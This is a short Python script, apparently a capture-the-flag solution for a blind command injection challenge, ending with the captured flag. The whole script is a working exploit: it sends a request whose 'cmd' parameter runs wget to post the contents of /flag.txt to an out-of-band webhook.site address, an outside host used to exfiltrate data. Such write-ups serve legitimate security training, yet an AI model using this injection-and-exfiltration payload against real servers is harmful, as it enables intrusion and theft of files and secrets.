import requests

OOBand = "https://webhook.site/f4c73293-5aef-4485-9b70-a05c9872ac99"
burp0_url = f"http://103.97.125.56:30735/?cmd=wget+--post-data+\"$(cat+/flag.txt)\"+-O-+{OOBand}"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

requests.head(burp0_url, headers=burp0_headers).text

## Flag: CHH{bl1Nd_c0MMaNd_InJec7iON_77136b14a66c6709c73ee598976fb731}
